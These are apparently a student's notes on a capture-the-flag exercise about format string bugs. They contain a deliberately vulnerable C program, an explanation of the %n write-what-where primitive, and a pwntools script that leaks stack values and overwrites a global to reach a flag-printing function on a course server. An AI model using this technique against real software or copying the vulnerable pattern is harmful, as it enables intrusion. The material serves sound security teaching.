**Hints from class**
- something messes up the alignment
- Similar to needing a return address buffer

**Write-What-Where**: means we can write whatever we want, to whatever loacation we want

- used to target other types of code pointers
	- strings!!

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
//#include "secret.h"

#define INPUT_SIZE 24

int language;

void translate() {
	int fd;
	char buffer[64];

	if((fd = open("./flag.txt", O_RDONLY)) < 0){
		perror("open failed!\n");
		exit(1);
	}


	int c = read(fd, buffer, 64);
	write(STDOUT_FILENO, buffer, c); 

	exit(0);
}

  
  

void modoutput(){

	volatile char buffer1[32];
	char buffer[16];

	fgets(buffer, INPUT_SIZE, stdin);
	printf(buffer);
	read(STDIN_FILENO, buffer, 64);

	if(language != 0xbad) {
		exit(1);
	}

}

  

int main(int argc, char **argv) {
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

  

printf("%p\n", &translate);

printf("%p\n", &language);

modoutput();

}
```



## Snippet From Notes
In the previous example we provided the address of the `value` variable, but what if the programmer forgot to include this argument? For example:

```
printf("what's my age again??? %n \n");
```

This is essentially the same scenario we discussed previously with our strings example: `printf` will parse the format string, see the `%n`, interpret the word at the appropriate location on the stack as the address argument, try to write to the location specified by this address, and most likely trigger a segmentation fault.

At this point you might be thinking: “Hmmm, if I can control the format string argument to `printf`, and I can leverage that ability to also control how many characters are written via `printf`. Consequently, I can write an arbitrary value via `%n`. Further, if I can control values on the stack, then I can control the address written to by `%n`. In short, I have a write-what-where primitive.” If you were thinking this, then you would be correct. A write-what-where vulnerability can be very powerful for the attacker, e.g., she can hijack the control-flow by targeting entries in the global offset table.

```python
trans_addr = 0x5555555548fa+0x5
lang_addr = 0x55555575504c

#leak info on the stack
def leak(param_num):
	p = remote('cs4401shell.walls.ninja', 9898)
	p.recvlines(2)
	p.sendline(f"%{param_num}$p".encode())
	leak_raw = p.recvline().strip()
	leak_val = int(leak_raw, 16)
	p.sendline(b'a')
	p.recvall()
	p.wait()
	return leak_val

for param_num in range(1, 32):
	try:
		with context.silent:
			leak_value = leak(param_num)
		log.info("Value leaked at param {num}: {val}".format(num=param_num, val=hex(leak_value)))
		pass
	except Exception as e:
		log.info("Failed to leak param number {num}".format(num=param_num))

align = 3
exploit_str = flat({
	0:b'%2989s%10$n',
	16+align:lang_addr
})

exploit_str_2 = flat({
	align: p64(trans_addr)*10
})

p = remote('cs4401shell.walls.ninja', 9898)
p.clean_and_log()

p.sendline(exploit_str)
p.sendline(exploit_str_2)

p.recvall(timeout=1)
p.wait()
```

#### Gloabl vs. Local
- local: stored on the stack
- global: stored near the text/code section
	- overwrite with %n specifier
